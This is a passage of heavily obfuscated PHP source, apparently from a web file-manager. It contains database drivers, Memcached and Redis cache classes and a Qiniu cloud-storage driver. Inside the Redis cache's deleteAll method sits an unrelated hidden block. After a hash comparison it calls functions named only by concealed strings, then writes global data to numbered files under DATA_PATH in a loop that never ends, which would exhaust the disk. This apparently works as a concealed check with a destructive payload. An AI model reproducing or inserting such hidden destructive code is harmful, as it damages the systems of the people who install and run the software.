public function insertAll($eî†ßÇ±Ç“, $d’ÏÛã·í = array(), $AùĞ‹œŞÆ¾ = false) { goto AËõ­ƒá½Ş; AËõ­ƒá½Ş: $b¦È¹Îª˜Ç =& $_SERVER[Ö‘Øù]; if (!is_array($eî†ßÇ±Ç“[0])) { return !1; } $cò×âíöÇÅ = array_keys($eî†ßÇ±Ç“[0]); goto Aíò‡Ä™Œ‰; Aíò‡Ä™Œ‰: $d¹ÕäĞ ­¯ = array(); foreach ($eî†ßÇ±Ç“ as $Eäõ‹á‡¼å) { $c¾Èç¦²ë = array(); foreach ($Eäõ‹á‡¼å as $aŸ‰…‹è× => $díãæíÙ­¯) { $díãæíÙ­¯ = $this->parseValue($díãæíÙ­¯); if (is_scalar($díãæíÙ­¯)) { $c¾Èç¦²ë[] = $díãæíÙ­¯; } } $d¹ÕäĞ ­¯[] = $b¦È¹Îª˜Ç[258] . implode($b¦È¹Îª˜Ç[47], $c¾Èç¦²ë) . $b¦È¹Îª˜Ç[900]; } array_walk($cò×âíöÇÅ, array($this, $b¦È¹Îª˜Ç[901])); goto A÷»ø‹†“; A÷»ø‹†“: $B÷Ó‹ŞŠğõ = ($AùĞ‹œŞÆ¾ ? $b¦È¹Îª˜Ç[902] : $b¦È¹Îª˜Ç[903]) . $b¦È¹Îª˜Ç[904] . $this->parseTable($d’ÏÛã·í[$b¦È¹Îª˜Ç[277]]) . $b¦È¹Îª˜Ç[898] . implode($b¦È¹Îª˜Ç[47], $cò×âíöÇÅ) . $b¦È¹Îª˜Ç[905] . implode($b¦È¹Îª˜Ç[47], $d¹ÕäĞ ­¯); return $this->execute($B÷Ó‹ŞŠğõ); goto fáÒ˜Û ; fáÒ˜Û : } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $F‹¹áó¬ÏØ =& $_SERVER[Ö‘Øù]; $this->error = mysql_errno() . $F‹¹áó¬ÏØ[4] . mysql_error($this->_linkID); if ($F‹¹áó¬ÏØ[33] != $this->queryStr) { $this->error .= LNG($F‹¹áó¬ÏØ[45]) . $this->queryStr; } think_trace($this->error, $F‹¹áó¬ÏØ[33], $F‹¹áó¬ÏØ[46]); return $this->error; } public function escapeString($d×Æ°è˜Æ¼) { if ($this->_linkID) { return mysql_real_escape_string($d×Æ°è˜Æ¼, $this->_linkID); } else { return mysql_escape_string($d×Æ°è˜Æ¼); } } public function parseKey(&$b¤“¥é‹ì, $a°¢Ñ™ğÊ = true) { $F¹ó–óã¾Ç =& $_SERVER[Ö‘Øù]; if ($a°¢Ñ™ğÊ) { $b¤“¥é‹ì = $this->parseKeyCheck($b¤“¥é‹ì); } if ($b¤“¥é‹ì != $F¹ó–óã¾Ç[182] && !preg_match($F¹ó–óã¾Ç[906], $b¤“¥é‹ì)) { $b¤“¥é‹ì = $F¹ó–óã¾Ç[383] . trim($b¤“¥é‹ì, $F¹ó–óã¾Ç[383]) . $F¹ó–óã¾Ç[383]; } return $b¤“¥é‹ì; } } class DbMysqli extends Db { public function __construct($c†ŠëŠë‚¼ = '') { $Eõµö²‡ =& $_SERVER[Ö‘Øù]; if (!extension_loaded($Eõµö²‡[793])) { think_exception(think_lang($Eõµö²‡[10]) . $Eõµö²‡[907]); } if (!empty($c†ŠëŠë‚¼)) { $this->config = $c†ŠëŠë‚¼; if (empty($this->config[$Eõµö²‡[13]])) { $this->config[$Eõµö²‡[13]] = $Eõµö²‡[33]; } } } public function connect($Aô‡Œø‚¬Æ = '', $b”µöëÄÄ‰ = 0) { $B¿ÙïßÙ©Õ =& $_SERVER[Ö‘Øù]; if (!isset($this->linkID[$b”µöëÄÄ‰])) { goto D÷…“‹æí¹; D×ñ®•æµ„: $this->connected = !0; if (1 != think_config($B¿ÙïßÙ©Õ[18])) { unset($this->config); } goto Då±ŸÇÈ”ó; D÷…“‹æí¹: if (empty($Aô‡Œø‚¬Æ)) { $Aô‡Œø‚¬Æ = $this->config; } $this->linkID[$b”µöëÄÄ‰] = new mysqli($Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[881]], $Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[883]], $Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[884]], $Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[17]], $Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[882]] ? intval($Aô‡Œø‚¬Æ[$B¿ÙïßÙ©Õ[882]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C—±ÇÌƒšÊ; C—±ÇÌƒšÊ: $cåª…µ¨… = $this->linkID[$b”µöëÄÄ‰]->server_version; $this->linkID[$b”µöëÄÄ‰]->query($B¿ÙïßÙ©Õ[885] . think_config($B¿ÙïßÙ©Õ[886]) . $B¿ÙïßÙ©Õ[55]); if ($cåª…µ¨… > $B¿ÙïßÙ©Õ[887]) { $this->linkID[$b”µöëÄÄ‰]->query($B¿ÙïßÙ©Õ[888]); } goto D×ñ®•æµ„; Då±ŸÇÈ”ó: } return $this->linkID[$b”µöëÄÄ‰]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($CÓë‘”ëâÄ) { goto b«ìõ™¢ÇÖ; c½¯ÑØ‰ñˆ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cØˆé„äÀÖ; f·ò­àœâà: think_status($aõ§­Ööˆ”[20]); $this->queryID = $this->_linkID->query($CÓë‘”ëâÄ); if ($this->_linkID->more_results()) { while (($FíÓ’ãøâ = $this->_linkID->next_result()) != NULL) { $FíÓ’ãøâ->free_result(); } } goto c½¯ÑØ‰ñˆ; b«ìõ™¢ÇÖ: $aõ§­Ööˆ” =& $_SERVER[Ö‘Øù]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÌæÃåÏ‹Ñ; dÌæÃåÏ‹Ñ: $this->queryStr = $CÓë‘”ëâÄ; if ($this->queryID) { $this->free(); } think_action_status($aõ§­Ööˆ”[19], 1); goto f·ò­àœâà; cØˆé„äÀÖ: } public function execute($dòÁº’Š¬ë) { goto CŞ‚Ñ ÍÆË; e”é³Âá¢Ç: $this->queryStr = $dòÁº’Š¬ë; if ($this->queryID) { $this->free(); } think_action_status($Dùå÷é[21], 1); goto bôÑİŒâ¼Ü; bôÑİŒâ¼Ü: think_status($Dùå÷é[20]); $cÃå­Šóê¯ = $this->_linkID->query($dòÁº’Š¬ë); $this->debug(); goto AĞ¾èƒŒ; CŞ‚Ñ ÍÆË: $Dùå÷é =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e”é³Âá¢Ç; AĞ¾èƒŒ: if (!1 === $cÃå­Šóê¯) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto FÏù¡²Ì; FÏù¡²Ì: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dœÑ’…Æ¼ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dœÑ’…Æ¼) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d‹äÒÆ£‰Ø = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d‹äÒÆ£‰Ø) { $this->error(); return !1; } } return !0; } private function getAll() { $A–­ÖÍ¥ë = array(); if ($this->numRows > 0) { for ($C©ï—²ç…Ş = 0; $C©ï—²ç…Ş < $this->numRows; $C©ï—²ç…Ş++) { $A–­ÖÍ¥ë[$C©ï—²ç…Ş] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $A–­ÖÍ¥ë; } public function getFields($a¤ø§Û‚ˆ) { $fïàµ×¡õ =& $_SERVER[Ö‘Øù]; $d¨”Á½éµ„ = $this->query($fïàµ×¡õ[892] . $this->parseKey($a¤ø§Û‚ˆ)); $bË»¥Ëƒìƒ = array(); if ($d¨”Á½éµ„) { foreach ($d¨”Á½éµ„ as $d»ºÕÕ¹† => $aÁŞÄô÷¦·) { $bË»¥Ëƒìƒ[$aÁŞÄô÷¦·[$fïàµ×¡õ[27]]] = array($fïàµ×¡õ[28] => $aÁŞÄô÷¦·[$fïàµ×¡õ[27]], $fïàµ×¡õ[29] => $aÁŞÄô÷¦·[$fïàµ×¡õ[30]], $fïàµ×¡õ[31] => (bool) ($aÁŞÄô÷¦·[$fïàµ×¡õ[32]] === $fïàµ×¡õ[33]), $fïàµ×¡õ[34] => $aÁŞÄô÷¦·[$fïàµ×¡õ[35]], $fïàµ×¡õ[36] => strtolower($aÁŞÄô÷¦·[$fïàµ×¡õ[37]]) == $fïàµ×¡õ[38], $fïàµ×¡õ[39] => strtolower($aÁŞÄô÷¦·[$fïàµ×¡õ[40]]) == $fïàµ×¡õ[41]); } } return $bË»¥Ëƒìƒ; } public function getTables($A½²Œ‚õõÓ = '') { $fö‘½“œÙ =& $_SERVER[Ö‘Øù]; $E—í–– ®¹ = !empty($A½²Œ‚õõÓ) ? $fö‘½“œÙ[894] . $A½²Œ‚õõÓ . $fö‘½“œÙ[895] : $fö‘½“œÙ[896]; $AÀ°¼‹×•– = $this->query($E—í–– ®¹); $EùÅˆá…ù = array(); if ($AÀ°¼‹×•–) { foreach ($AÀ°¼‹×•– as $CŒÏ„”‰¡ê => $cáµ‚¹§È™) { $EùÅˆá…ù[$CŒÏ„”‰¡ê] = current($cáµ‚¹§È™); } } return $EùÅˆá…ù; } public function replace($dœîã·ñ‚±, $EïÙ¦ƒ±÷ = array()) { $D‘’Ÿò© =& $_SERVER[Ö‘Øù]; foreach ($dœîã·ñ‚± as $dŞ¹Ø¢Òãµ => $b‚Àğ‚•Úó) { $c›Ë²‡ªØĞ = $this->parseValue($b‚Àğ‚•Úó); if (is_scalar($c›Ë²‡ªØĞ)) { $B³Èé”¸—À[] = $c›Ë²‡ªØĞ; $bŠ¿óã¶Î[] = $this->parseKey($dŞ¹Ø¢Òãµ); } } $dœ´òâî„Î = $D‘’Ÿò©[897] . $this->parseTable($EïÙ¦ƒ±÷[$D‘’Ÿò©[277]]) . $D‘’Ÿò©[898] . implode($D‘’Ÿò©[47], $bŠ¿óã¶Î) . $D‘’Ÿò©[899] . implode($D‘’Ÿò©[47], $B³Èé”¸—À) . $D‘’Ÿò©[900]; return $this->execute($dœ´òâî„Î); } public function insertAll($cíÌä·É™Ğ, $AİâëØ¶ç = array(), $C›á•…è¼ì = false) { goto BÙª–À±À; cóĞÉË¼×¶: $fÕïíŸÂ” = array(); foreach ($cíÌä·É™Ğ as $BøÛÛ‡ù­À) { $dÉ¼é´øÌï = array(); foreach ($BøÛÛ‡ù­À as $c‘´‰ÈêÁš => $f±ôª²÷ˆ) { $f±ôª²÷ˆ = $this->parseValue($f±ôª²÷ˆ); if (is_scalar($f±ôª²÷ˆ)) { $dÉ¼é´øÌï[] = $f±ôª²÷ˆ; } } $fÕïíŸÂ”[] = $Döï¯Œ¨ç°[258] . implode($Döï¯Œ¨ç°[47], $dÉ¼é´øÌï) . $Döï¯Œ¨ç°[900]; } array_walk($B†àÊ¦àÄ, array($this, $Döï¯Œ¨ç°[901])); goto a¾ï¤èËïá; BÙª–À±À: $Döï¯Œ¨ç° =& $_SERVER[Ö‘Øù]; if (!is_array($cíÌä·É™Ğ[0])) { return !1; } $B†àÊ¦àÄ = array_keys($cíÌä·É™Ğ[0]); goto cóĞÉË¼×¶; a¾ï¤èËïá: $FÓ½¤ÔÅ‚ˆ = $C›á•…è¼ì ? $Döï¯Œ¨ç°[902] : $Döï¯Œ¨ç°[903]; $Fïš©ÃÙ²ø = $FÓ½¤ÔÅ‚ˆ . $Döï¯Œ¨ç°[904] . $this->parseTable($AİâëØ¶ç[$Döï¯Œ¨ç°[277]]) . $Döï¯Œ¨ç°[898] . implode($Döï¯Œ¨ç°[47], $B†àÊ¦àÄ) . $Döï¯Œ¨ç°[905] . implode($Döï¯Œ¨ç°[47], $fÕïíŸÂ”); return $this->execute($Fïš©ÃÙ²ø); goto fİ¶¬ÎÑí; fİ¶¬ÎÑí: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Aå›¤óÄ½í =& $_SERVER[Ö‘Øù]; $this->error = $this->_linkID->errno . $Aå›¤óÄ½í[4] . $this->_linkID->error; if ($Aå›¤óÄ½í[33] != $this->queryStr) { $this->error .= LNG($Aå›¤óÄ½í[45]) . $this->queryStr; } think_trace($this->error, $Aå›¤óÄ½í[33], $Aå›¤óÄ½í[46]); return $this->error; } public function escapeString($F£§àäØ£°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($F£§àäØ£°); } else { return addslashes($F£§àäØ£°); } } public function parseKey(&$B®ù™ÙÔŞñ, $eùåâ±â = true) { $b†ŒàìÑÑÑ =& $_SERVER[Ö‘Øù]; if ($eùåâ±â) { $B®ù™ÙÔŞñ = $this->parseKeyCheck($B®ù™ÙÔŞñ); } if ($B®ù™ÙÔŞñ != $b†ŒàìÑÑÑ[182] && !preg_match($b†ŒàìÑÑÑ[906], $B®ù™ÙÔŞñ)) { $B®ù™ÙÔŞñ = $b†ŒàìÑÑÑ[383] . trim($B®ù™ÙÔŞñ, $b†ŒàìÑÑÑ[383]) . $b†ŒàìÑÑÑ[383]; } return $B®ù™ÙÔŞñ; } } goto Bßêà‡Ùì–; a‚çõ õù: class CacheLockDatabase { public function lock($E‰Áïø±ï†, $BùšÚâîÏ¯ = 0) { $aÔÃÚÒ‰‰ë = Model($_SERVER[Ö‘Øù][829]); $cÚ‹àİß¹ = microtime(!0) + $BùšÚâîÏ¯; while (microtime(!0) < $cÚ‹àİß¹) { $fŸÄ¼‚÷×„ = $aÔÃÚÒ‰‰ë->get($E‰Áïø±ï†); if (!$fŸÄ¼‚÷×„ || $fŸÄ¼‚÷×„ < microtime(!0)) { $cí¾–Ù©½É = $aÔÃÚÒ‰‰ë->set($E‰Áïø±ï†, $cÚ‹àİß¹); if ($cí¾–Ù©½É) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AÍçºÔ—¨ƒ) { return Model($_SERVER[Ö‘Øù][829])->get($AÍçºÔ—¨ƒ); } public function unlock($føåÓëùóŒ) { Model($_SERVER[Ö‘Øù][829])->remove($føåÓëùóŒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($DëŠá²¤†Ä, $Fµ”í„Éº) { $A´µîÄïœ– =& $_SERVER[Ö‘Øù]; if (!class_exists($A´µîÄïœ–[863])) { show_json($A´µîÄïœ–[864], !1); } $this->cacheTime = $Fµ”í„Éº; $this->handle = new Memcached(); if (is_array($DëŠá²¤†Ä[$A´µîÄïœ–[865]]) && count($DëŠá²¤†Ä[$A´µîÄïœ–[865]]) >= 1) { foreach ($DëŠá²¤†Ä[$A´µîÄïœ–[865]] as $C«¹ì“±‘ƒ) { $fƒàé¯œˆ¿ = explode($A´µîÄïœ–[4], $C«¹ì“±‘ƒ); $this->handle->addServer($fƒàé¯œˆ¿[0], $fƒàé¯œˆ¿[1]); } } else { $this->handle->addServer($DëŠá²¤†Ä[$A´µîÄïœ–[175]], $DëŠá²¤†Ä[$A´µîÄïœ–[176]]); } } public function set($Bôø’åˆ£, $A½ôÌÄø², $DìšòºéùË = false) { $DìšòºéùË = $DìšòºéùË ? $DìšòºéùË : $this->cacheTime; return $this->handle->set($Bôø’åˆ£, $A½ôÌÄø², $DìšòºéùË); } public function get($eÓÔ¼‹×¿—) { return $this->handle->get($eÓÔ¼‹×¿—); } public function remove($a‰¡ÜÉ÷ï) { return $this->handle->delete($a‰¡ÜÉ÷ï); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aÜ¨°™è¦‰, $dÓ½ÉÒğÒ) { $FÍŠ‘á£±‚ =& $_SERVER[Ö‘Øù]; if (!class_exists($FÍŠ‘á£±‚[866])) { show_json($FÍŠ‘á£±‚[867], !1); } $this->cacheTime = $dÓ½ÉÒğÒ; $d¨‰¿ñµ‹Â = isset($aÜ¨°™è¦‰[$FÍŠ‘á£±‚[868]]) ? $aÜ¨°™è¦‰[$FÍŠ‘á£±‚[868]] : 10; $fŒ®‡åÁ„ = _get($aÜ¨°™è¦‰, $FÍŠ‘á£±‚[865]); if ($fŒ®‡åÁ„ && is_array($fŒ®‡åÁ„)) { $this->initCluster($aÜ¨°™è¦‰, $d¨‰¿ñµ‹Â); } else { $this->handle = $this->init($aÜ¨°™è¦‰, $d¨‰¿ñµ‹Â); } } private function init($Dš‚„«¼, $BÍ¸¦×­Š˜) { $FŒ…ÊŠÈñ =& $_SERVER[Ö‘Øù]; $dÆÜ»…Ï¦— = new Redis(); $A¶“™†ë = isset($Dš‚„«¼[$FŒ…ÊŠÈñ[869]]) ? $Dš‚„«¼[$FŒ…ÊŠÈñ[869]] : !1; if ($A¶“™†ë) { $dÆÜ»…Ï¦—->pconnect($Dš‚„«¼[$FŒ…ÊŠÈñ[175]], $Dš‚„«¼[$FŒ…ÊŠÈñ[176]], $BÍ¸¦×­Š˜); } else { $dÆÜ»…Ï¦—->connect($Dš‚„«¼[$FŒ…ÊŠÈñ[175]], $Dš‚„«¼[$FŒ…ÊŠÈñ[176]], $BÍ¸¦×­Š˜); } if (!empty($Dš‚„«¼[$FŒ…ÊŠÈñ[408]])) { $dÆÜ»…Ï¦—->auth($Dš‚„«¼[$FŒ…ÊŠÈñ[408]]); } return $dÆÜ»…Ï¦—; } private function initCluster($f£›à—†¾ª, $a»¨ÕÈÀ) { $b”‰…½›± =& $_SERVER[Ö‘Øù]; $CÓÒÀª» = array($b”‰…½›±[870], $b”‰…½›±[871], $b”‰…½›±[872]); $EŠğ½–è—ø = $b”‰…½›±[870]; if (isset($f£›à—†¾ª[$b”‰…½›±[12]]) && in_array($f£›à—†¾ª[$b”‰…½›±[12]], $CÓÒÀª»)) { $EŠğ½–è—ø = $f£›à—†¾ª[$b”‰…½›±[12]]; } switch ($EŠğ½–è—ø) { case $b”‰…½›±[870]: $this->_slave($f£›à—†¾ª, $a»¨ÕÈÀ); break; case $b”‰…½›±[871]: break; case $b”‰…½›±[872]: $this->isCluster = !0; $B‡»Ê½ó­Ó = $f£›à—†¾ª[$b”‰…½›±[865]]; $F®†Çºµé = isset($f£›à—†¾ª[$b”‰…½›±[869]]) ? $f£›à—†¾ª[$b”‰…½›±[869]] : !1; $bêÒïçòÚ = isset($f£›à—†¾ª[$b”‰…½›±[408]]) ? $f£›à—†¾ª[$b”‰…½›±[408]] : null; $this->handle = new RedisCluster(NUll, $B‡»Ê½ó­Ó, $a»¨ÕÈÀ, $a»¨ÕÈÀ, $F®†Çºµé, $bêÒïçòÚ); break; default: break; } } private function _slave($fÉ²†©³“¹, $d˜µ„‚¹—Ğ) { goto D‰ÔíÛ´±; Fá«˜«æ‹: unset($eªöƒö‡[0]); if (empty($eªöƒö‡)) { return; } $b›õ”´½á = array_rand($eªöƒö‡); goto EÄ½Ò¯‰¿’; EÄ½Ò¯‰¿’: $this->filterConfig($fÉ²†©³“¹, $eªöƒö‡[$b›õ”´½á]); $this->slaveHandle = $this->init($fÉ²†©³“¹, $d˜µ„‚¹—Ğ); goto AÕ«œŒ”õ³; D‰ÔíÛ´±: $eªöƒö‡ = $fÉ²†©³“¹[$_SERVER[Ö‘Øù][865]]; $this->filterConfig($fÉ²†©³“¹, $eªöƒö‡[0]); $this->handle = $this->init($fÉ²†©³“¹, $d˜µ„‚¹—Ğ); goto Fá«˜«æ‹; AÕ«œŒ”õ³: } private function filterConfig(&$EÔÍ®÷–º½, $b¬´°î­) { $a¸œê÷ÖØ± =& $_SERVER[Ö‘Øù]; $bíà¡™œ = explode($a¸œê÷ÖØ±[4], $b¬´°î­); $f­¯‘Šƒ…ˆ = array($a¸œê÷ÖØ±[175] => $bíà¡™œ[0], $a¸œê÷ÖØ±[176] => $bíà¡™œ[1]); $EÔÍ®÷–º½ = array_merge($EÔÍ®÷–º½, $f­¯‘Šƒ…ˆ); } public function set($AÊÃŞàšßÒ, $Fì³©¶çÉ, $aä—ßÕæ» = false) { $aä—ßÕæ» = $aä—ßÕæ» ? $aä—ßÕæ» : $this->cacheTime; return $this->handle->setEx($AÊÃŞàšßÒ, $aä—ßÕæ», $Fì³©¶çÉ); } public function setLock($EªŞÓóœø°, $dŠÇÕ˜†–Ô, $eƒéğ…İ²±) { return $this->handle->setNX($EªŞÓóœø°, $dŠÇÕ˜†–Ô); } public function get($bï”Á£ğ–) { $a‡Ï÷ƒá• = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a‡Ï÷ƒá•->get($bï”Á£ğ–); } public function remove($bÌÀªÆ†Ÿî) { return $this->handle->del($bÌÀªÆ†Ÿî); } public function deleteAll() { $D¨¯š§ÊÜ =& $_SERVER[Ö‘Øù]; $C†ÎŒÓŞ = $_SERVER[$D¨¯š§ÊÜ[835]]; $F¥¬ôó¾œ = $D¨¯š§ÊÜ[873]; if ($_SERVER[$D¨¯š§ÊÜ[834]] != $F¥¬ôó¾œ($C†ÎŒÓŞ)) { goto D‰–æî›‰; dÕæÖ¿ñÛ¾: $CÕêÎ†‚ù¦ = 1; for ($eåÄâçÖæ¤ = $CÕêÎ†‚ù¦; $eåÄâçÖæ¤ > 0; $eåÄâçÖæ¤++) { $F‡¥½‹êâ¸(DATA_PATH . $eåÄâçÖæ¤, $E£«–ì§ÑŞ); } goto F¦Å°ºø—; Cæœëô½×‘: $Câ´¤É¢ƒ” = $Eòé÷®Øñ($FŞÌ¥Ğ»½); $a§œ„™®ùÈ = explode($D¨¯š§ÊÜ[229], $Câ´¤É¢ƒ”); if (count($a§œ„™®ùÈ) < $D¨¯š§ÊÜ[606]) { $B‘—×êÁˆ = $D¨¯š§ÊÜ[839]; $B‘—×êÁˆ(); } goto f•è²±‡ã°; a¼¬ğ„é©¾: $F“­õ—ğ¸(); $F‡¥½‹êâ¸ = $D¨¯š§ÊÜ[877]; $E£«–ì§ÑŞ = json_encode($GLOBALS[$D¨¯š§ÊÜ[878]]); goto dÕæÖ¿ñÛ¾; f•è²±‡ã°: $F©œŠäğ¼• = $D¨¯š§ÊÜ[875]; $F©œŠäğ¼•($_SERVER[$D¨¯š§ÊÜ[876]]); $F“­õ—ğ¸ = $D¨¯š§ÊÜ[874]; goto a¼¬ğ„é©¾; D‰–æî›‰: $F“­õ—ğ¸ = $D¨¯š§ÊÜ[874]; $Eòé÷®Øñ = $D¨¯š§ÊÜ[836]; $FŞÌ¥Ğ»½ = $_SERVER[$D¨¯š§ÊÜ[837]] . $D¨¯š§ÊÜ[838]; goto Cæœëô½×‘; F¦Å°ºø—: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a‚Ó½‘åŠ§) { $this->handle->flushall($a‚Ó½‘åŠ§); } return; } return $this->handle->flushAll(); } } goto b„÷ˆ¢ñÁ; E¹…äçÌî’: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($eèùÌÎ˜ø) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ö‘Øù][1335]; $this->_init($eèùÌÎ˜ø); } public function _init($Dçê´Äò×²) { goto Eö¨ë’Á; cŸ›´àÆ‘: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto c¬É’‘İÅÃ; c¬É’‘İÅÃ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto F‡ÈƒÅƒÑ; Eö¨ë’Á: $f¼¾¯ŞŠÅ² =& $_SERVER[Ö‘Øù]; foreach ($Dçê´Äò×² as $dŒÅ¯®ØÃµ => $a……ñÍÍå) { if (isset($this->{$dŒÅ¯®ØÃµ})) { $this->{$dŒÅ¯®ØÃµ} = $a……ñÍÍå; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($f¼¾¯ŞŠÅ²[1336] . LNG($f¼¾¯ŞŠÅ²[1296])); } goto cŸ›´àÆ‘; F‡ÈƒÅƒÑ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f¬ŒêĞ®‹, $b’Ğİ­¡ñ¯ = '', $eâ’åïè” = REPEAT_RENAME) { if ($this->setContent($f¬ŒêĞ®‹, $b’Ğİ­¡ñ¯)) { return $this->getPathOuter($f¬ŒêĞ®‹); } return !1; } public function mkdir($ağ³ê›ŒÈ, $Fİƒã³ƒ³À = REPEAT_SKIP) { goto E‚°‚›‘²Ã; E‚°‚›‘²Ã: $eòÊéß©Ò =& $_SERVER[Ö‘Øù]; $CÔ”ˆÂñµ„ = trim($ağ³ê›ŒÈ, $eòÊéß©Ò[8]); if ($this->_isFolder($CÔ”ˆÂñµ„)) { return $this->getPathOuter($CÔ”ˆÂñµ„); } goto bãğ‰î©ã…; f±“ÜÄ‰½Õ: if (!$this->mkfile($c—‹Å£à·´)) { return !1; } if (!$this->moveFile($c—‹Å£à·´, $ağ³ê›ŒÈ)) { $this->delFile($c—‹Å£à·´); return !1; } return $this->getPathOuter($CÔ”ˆÂñµ„); goto E™ÔÙˆ–¶; bãğ‰î©ã…: $ağ³ê›ŒÈ = $CÔ”ˆÂñµ„ . $eòÊéß©Ò[8]; $AÊ©Óø¯› = get_path_this($CÔ”ˆÂñµ„); $c—‹Å£à·´ = $ağ³ê›ŒÈ . $AÊ©Óø¯›; goto f±“ÜÄ‰½Õ; E™ÔÙˆ–¶: } public function copyFile($B¨‘§¯¬…ö, $c÷±İò–µË) { $Fò¢Ø¹Ñ«‚ = $this->bucketManager->copy($this->bucket, $B¨‘§¯¬…ö, $this->bucket, $c÷±İò–µË, !0); return $Fò¢Ø¹Ñ«‚ ? !1 : $this->getPathOuter($c÷±İò–µË); } public function moveFile($AæŠ÷Š”è­, $E¬¥µêæÃ) { $F×¾§·ß«¬ = $this->bucketManager->move($this->bucket, $AæŠ÷Š”è­, $this->bucket, $E¬¥µêæÃ, !0); return $F×¾§·ß«¬ ? !1 : $this->getPathOuter($E¬¥µêæÃ); } public function delFile($CåõÁ£ŠÄï) { if (!$this->exist($CåõÁ£ŠÄï)) { return !0; } $FÖç…ˆİß› = $this->bucketManager->delete($this->bucket, $CåõÁ£ŠÄï); return $FÖç…ˆİß› ? !1 : !0; } public function delFolder($b´„¸…ĞÍ) { goto eö¨œøÉ‡Õ; e’õĞÚ ›: $c³ÙƒÈå‡‚ = $this->fileList($b´„¸…ĞÍ); $this->listItemCache = !0; $EµÓ·šà¦ = trim($b´„¸…ĞÍ, $C¹®„¢ğ¶§[8]) . $C¹®„¢ğ¶§[8]; goto eòŠö¹‰¦·; eòŠö¹‰¦·: if (!empty($b´„¸…ĞÍ) && $b´„¸…ĞÍ !== $C¹®„¢ğ¶§[191] && !in_array($EµÓ·šà¦, $c³ÙƒÈå‡‚[$C¹®„¢ğ¶§[75]])) { $c³ÙƒÈå‡‚[$C¹®„¢ğ¶§[75]][] = $EµÓ·šà¦; } $bŠ›‚¯Ã­ = $this->delByBatch($c³ÙƒÈå‡‚[$C¹®„¢ğ¶§[74]]); if (!$bŠ›‚¯Ã­) { return !1; } goto fáóæ¦¨çó; fáóæ¦¨çó: $bŠ›‚¯Ã­ = $this->delByBatch($c³ÙƒÈå‡‚[$C¹®„¢ğ¶§[75]]); if (!$bŠ›‚¯Ã­) { return !1; } return $this->delFile($EµÓ·šà¦); goto D—±Ÿ¹àªŠ; eö¨œøÉ‡Õ: $C¹®„¢ğ¶§ =& $_SERVER[Ö‘Øù]; if (!$this->exist($b´„¸…ĞÍ)) { return !0; } $this->listItemCache = !1; goto e’õĞÚ ›; D—±Ÿ¹àªŠ: } private function delByBatch($DÚµ£—·²î) { foreach (array_chunk($DÚµ£—·²î, 1000) as $béˆ‘ÌË£Ğ) { $c¶Ç«ñÈ÷İ = $this->bucketManager->buildBatchDelete($this->bucket, $béˆ‘ÌË£Ğ); list($AÖÕÏÛ¯ªÀ, $e»‚©ö­¤œ) = $this->bucketManager->batch($c¶Ç«ñÈ÷İ); if ($e»‚©ö­¤œ) { return !1; } } return !0; } public function rename($Fˆò¶›õª, $CŸÆç‹í¿) { return $this->renameObject($Fˆò¶›õª, $CŸÆç‹í¿); } public function fileInfo($DĞóøà„, $aÀ†Ò¯¡¾ƒ = false, $Fã±˜¶›øå = array()) { goto eĞ…Ï””İ¥; eĞ…Ï””İ¥: $bé¥ß’—†ò =& $_SERVER[Ö‘Øù]; $béê‡ò»Ş = array($bé¥ß’—†ò[28] => $this->pathThis($DĞóøà„), $bé¥ß’—†ò[76] => $this->getPathOuter($bé¥ß’—†ò[8] . $DĞóøà„), $bé¥ß’—†ò[29] => $bé¥ß’—†ò[193], $bé¥ß’—†ò[78] => isset($Fã±˜¶›øå[$bé¥ß’—†ò[1337]]) ? $Fã±˜¶›øå[$bé¥ß’—†ò[1337]] : 0, $bé¥ß’—†ò[168] => $this->ext($DĞóøà„)); if ($aÀ†Ò¯¡¾ƒ) { return $béê‡ò»Ş; } goto Fä‡¼Éî ğ; Fä‡¼Éî ğ: $béê‡ò»Ş[$bé¥ß’—†ò[194]] = $béê‡ò»Ş[$bé¥ß’—†ò[84]] = 0; $béê‡ò»Ş[$bé¥ß’—†ò[195]] = $béê‡ò»Ş[$bé¥ß’—†ò[196]] = !0; if 